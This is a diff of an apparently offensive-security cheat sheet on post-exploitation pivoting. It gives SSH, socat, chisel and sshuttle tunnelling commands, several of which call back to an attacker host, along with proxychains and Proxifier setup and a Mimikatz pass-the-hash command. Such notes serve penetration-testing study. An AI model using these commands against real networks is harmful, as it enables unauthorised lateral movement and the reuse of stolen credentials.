@@ -1,13 +1,14 @@
 # Post Exploitation
-* [Pivoting](#Pivoting)
-  * [Local Port forwarding](#Local-Port-forwarding)
-  * [Remote port forwarding](#Remote-port-forwarding)
-  * [Proxychains](#Proxychains)
+* [Local Port forwarding](#Local-Port-forwarding)
+* [Remote port forwarding](#Remote-port-forwarding)
+* [Socks Proxy](#Socks-Proxy)
+  * [Configuring proxychains](#Configuring-proxychains)
+  * [Using proxychains](#Using-proxychains)
+* [Other tunneling options](#Other-tunneling-options)
 * [File Transfers](#File-transfers)
 * [Misc](#Misc)
 
-## Pivoting
-### Local Port forwarding
+## Local Port forwarding
 #### SSH
 - Will connect local port to target port on target IP. 
 - Usefull for example when database server is running on localhost on target and you want to connect to it on your kali.
@@ -56,7 +57,7 @@ socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP>:<TARGET PORT>
 socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
 ```
 
-### Remote port forwarding
+## Remote port forwarding
 - Forward local port of target back to our kali
 
 #### SSH
@@ -71,17 +72,14 @@ ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
 plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
 ```
 
-### Proxychains
-- Prepend ```proxychains``` command before every command to send through the proxychain.
-- Change proxychains config to the correct port and protocol! ```vim /etc/proxychains.conf```
-- Example: ```socks4		127.0.0.1 9000```
-
+## Sockx proxy
+### Configuring proxychains
 #### SSH
 ```
 sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
 ```
 
-#### Proxychains over hop
+#### SSH over hop
 ```
 ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
 ```
@@ -93,11 +91,36 @@ ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
 ./chisel.exe client <ATTACKER IP>:443 R:socks
 ```
 
-#### Rpivot
-- https://github.com/klsecservices/rpivot
+### Using proxychains
+#### Proxychains
+- For linux
+- Change proxychains config `socks5 <IP> <PORT> <USER> <PASS>`
+```
+sudo vim /etc/proxychains.conf
+proxychains <COMMAND>
+```
 
+#### Proxifier
+- https://www.proxifier.com/
+- For windows
+- Open Proxifier, go to Profile -> Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
+- Next, go to Profile -> Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
+- Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
+- NOTE: You will also need to add a static host entry in `C:\Windows\System32\drivers\etc\hosts` file: `<DC IP> <DOMAIN>`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.
 
-### sshuttle
+#### Proxychains netonly or overpass the hash
+```
+runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
+```
+
+#### Browser
+- Install FoxyProxy https://getfoxyproxy.org/
+- Configure Proxy IP and port, Username and Password.
+- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/
+
+## Other tunneling options
+#### sshuttle
 ```
 sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL> --ssh-cmd 'ssh -i /home/user/Offshore/id_rsa_root_nix01'
 sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL>
